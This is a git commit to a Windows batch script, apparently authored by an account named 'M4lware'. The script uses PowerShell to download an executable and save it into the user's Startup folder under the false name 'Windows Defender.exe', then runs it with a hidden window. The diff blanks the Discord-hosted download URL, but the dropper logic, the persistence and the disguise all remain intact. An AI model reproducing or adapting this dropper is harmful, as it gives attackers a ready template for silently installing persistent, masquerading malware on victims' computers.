44d0fb5476c8052d3a2f353003982ed4e203092b
M4lware <128651023+M4lware-01@users.noreply.github.com>
2023-08-16 07:18:57 +0600

    Update script.bat

--- script.bat
+++ script.bat
@@ -1,7 +1,7 @@
 @echo off
 
 set powershell=%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\powershell.exe
-set "DownloadURL=https://cdn.discordapp.com/attachments/1140688734329778208/1140688944711876711/x.exe"
+set "DownloadURL="
 set "DestinationPath=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Defender.exe"
 powershell -Command "Invoke-WebRequest -useb '%DownloadURL%' -o '%DestinationPath%'"
 powershell -Command "Start-Process '%DestinationPath%' -WindowStyle Hidden"
